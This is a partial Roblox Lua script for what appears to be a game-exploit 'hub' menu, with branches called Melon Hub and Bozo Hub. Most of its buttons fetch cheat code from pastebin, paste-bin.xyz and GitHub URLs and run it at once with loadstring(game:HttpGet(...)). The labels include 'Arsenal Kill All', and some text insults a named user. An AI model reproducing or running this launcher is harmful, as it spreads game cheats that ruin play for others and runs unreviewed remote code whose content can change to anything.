...
animefighter.Name = "animefighter"
...
lucky.Text = "LUCKY HUB (NOT WORKING!)"
...
local function JWMNTWX_fake_script() -- zombier_2.LocalScript 
...
coroutine.wrap(ITRWET_fake_script)()
local function UEWXT_fake_script() -- tower.LocalScript 
	local script = Instance.new('LocalScript', tower)
...
coroutine.wrap(UEWXT_fake_script)()
local function GNXLSYK_fake_script() -- madcity.LocalScript 
	local script = Instance.new('LocalScript', madcity)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://paste-bin.xyz/raw/12857%22", true))()
	end)
end
coroutine.wrap(GNXLSYK_fake_script)()
local function UAITSDP_fake_script() -- squid.LocalScript 
	local script = Instance.new('LocalScript', squid)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://paste-bin.xyz/raw/12595%22", true))()
	end)
end
coroutine.wrap(UAITSDP_fake_script)()
local function BRZX_fake_script() -- punchsim.LocalScript 
	local script = Instance.new('LocalScript', punchsim)
...
coroutine.wrap(BRZX_fake_script)()
local function XKKKTC_fake_script() -- project.LocalScript 
	local script = Instance.new('LocalScript', project)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/lmmake/jojo-/main/ProjectJojoGame%3AD"))()
	end)
end
coroutine.wrap(XKKKTC_fake_script)()
local function ZBANKBO_fake_script() -- netless.LocalScript 
...
coroutine.wrap(ZBANKBO_fake_script)()
local function UVJOUP_fake_script() -- dragon.LocalScript 
	local script = Instance.new('LocalScript', dragon)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/AC7at7uJ'),true))()
	end)
end
coroutine.wrap(UVJOUP_fake_script)()
local function BBQW_fake_script() -- fling.LocalScript 
...
coroutine.wrap(BBQW_fake_script)()
local function XMCQD_fake_script() -- galac.LocalScript 
	local script = Instance.new('LocalScript', galac)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/YqgUQ5Zj'),true))()
	end)
end
coroutine.wrap(XMCQD_fake_script)()
local function COHZ_fake_script() -- child.LocalScript 
...
coroutine.wrap(COHZ_fake_script)()
local function ZFEWZD_fake_script() -- cyber.LocalScript 
	local script = Instance.new('LocalScript', cyber)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/9QvXVnnp', true))()
	end)
end
coroutine.wrap(ZFEWZD_fake_script)()
local function XYUEBO_fake_script() -- jump.LocalScript 
...
coroutine.wrap(XYUEBO_fake_script)()
local function YHWWCUY_fake_script() -- animaiton.LocalScript 
	local script = Instance.new('LocalScript', animaiton)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
	end)
end
coroutine.wrap(YHWWCUY_fake_script)()
local function ILBX_fake_script() -- pog.LocalScript 
	local script = Instance.new('LocalScript', pog)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/JT5yZbDs",true))()
	end)
end
coroutine.wrap(ILBX_fake_script)()
local function DQSG_fake_script() -- gaunlet.LocalScript 
	local script = Instance.new('LocalScript', gaunlet)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/hQPjzRw1'),true))()
	end)
end
coroutine.wrap(DQSG_fake_script)()
local function PZLKU_fake_script() -- test.LocalScript 
	...
	script.Parent.MouseButton1Click:Connect(function()
		...
		-- Instances:
		game:GetService("StarterGui"):SetCore("SendNotification", { 
			Title = "Melon Hub Version 1";
			Text = "Inspired by vhub, gui from psy hub (edited)";
		...
		OpenBeautyFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		...
		EXPLOIT1.MouseButton1Down:connect(function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/fZ3X5Fed'),true))()
		end)
		...
		EXPLOIT5.MouseButton1Down:connect(function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/AuCDHS0q'),true))()
		end)
		...
		EXPLOIT8.Text = "Arsenal Kill All (PC EXECUTORS)"
		...
		EXPLOIT10.MouseButton1Down:connect(function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/TQCXT0tq'),true))()
		end)
		...
		EXPLOIT11.MouseButton1Down:connect(function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/yZv4cByC'),true))()
		end)
		...
		EXPLOIT12.Text = "FE Krystal Dance"
		...
		EXPLOIT12.MouseButton1Down:connect(function()
			loadstring(game:HttpGet(('https://pastebin.com/raw/nicUmwKh'),true))()
		end)
		...
		EXPLOIT2.MouseButton1Down:connect(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/n3xaZeJH",true))()
		end)
		...
		EXPLOIT3.Text = "FE Nightmare Sans"
		...
		EXPLOIT3.MouseButton1Down:connect(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/qwEdFYaC"))()
		end)
		...
		EXPLOIT4.MouseButton1Down:connect(function()
			loadstring(game:HttpGet("https://pastebin.com/raw/Zt9XX47h"))()
		end)
...
coroutine.wrap(PZLKU_fake_script)()
local function DAUE_fake_script() -- test2.LocalScript 
	local script = Instance.new('LocalScript', test2)
...
coroutine.wrap(DAUE_fake_script)()
local function LWJPKA_fake_script() -- topkek.LocalScript 
...
coroutine.wrap(LWJPKA_fake_script)()
local function DXFLHHF_fake_script() -- moon.LocalScript 
...
coroutine.wrap(DXFLHHF_fake_script)()
local function FUES_fake_script() -- sight.LocalScript 
...
coroutine.wrap(FUES_fake_script)()
local function HIVRK_fake_script() -- psy.LocalScript 
...
local function QANNQVG_fake_script() -- lucky.LocalScript 
...
coroutine.wrap(QANNQVG_fake_script)()
local function FYKXFLU_fake_script() -- CARLHUB.LocalScript 
	local script = Instance.new('LocalScript', CARLHUB)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
	end)
end
coroutine.wrap(FYKXFLU_fake_script)()
local function LTAUBZS_fake_script() -- gabx.LocalScript 
...
local function LHSC_fake_script() -- ez.LocalScript 
...
coroutine.wrap(LHSC_fake_script)()
local function ALXKJW_fake_script() -- domain.LocalScript 
...
coroutine.wrap(ALXKJW_fake_script)()
local function VSPV_fake_script() -- citrus.LocalScript 
...
local function SFIVUR_fake_script() -- bozo.LocalScript 
	...
	script.Parent.MouseButton1Click:Connect(function()
		...
		Glow.ZIndex = 0
		Glow.Image = "rbxassetid://282610381"
		...
		welcomemessage.Text = "WELCOME TO BOZO HUB"
		...
		TextLabel_3.Text = "BozoHub on top"
		...
		TextLabel_5.Text = "DtbVoided is a skid"
		...
		memes.Text = "Enjoy Using Bozo Hub"
		...
		local function EGTRRF_fake_script() -- memes.LocalScript 
			...
			while true do
				...
				script.Parent.Text = "Dtb Imagine calling Me A Skid"
				wait(5)
				...
				script.Parent.Text = "dtbVoided is shit"
				wait(5)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 1})	Tween:Play()
				wait(1)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 0})	Tween:Play()
				script.Parent.Text ="Bozo Hub Release"
				wait(5)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 1})	Tween:Play()
				wait(1)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 0})	Tween:Play()
				script.Parent.Text = "Bozo Hub"
				wait(5)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 1})	Tween:Play()
				wait(1)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 0})	Tween:Play()
				script.Parent.Text = "BOZO HUB ON TOP"
				wait(5)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 1})	Tween:Play()
				wait(1)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 0})	Tween:Play()
				...
				wait(1)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 0})	Tween:Play()
				script.Parent.Text = "enjoy using Bozo Hub"
				wait(5)
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 1})	Tween:Play()
				wait(1)
				script.Parent.Text = "Rxl#0001"
				local Tween = game:GetService("TweenService"):Create(script.Parent, TweenInfo.new(1), {TextTransparency = 0})	Tween:Play()
			end
		end
...
coroutine.wrap(SFIVUR_fake_script)()
local function SYIR_fake_script() -- Frame.LocalScript 
...
coroutine.wrap(SYIR_fake_script)()
local function UYDCAF_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)
...
coroutine.wrap(UYDCAF_fake_script)()
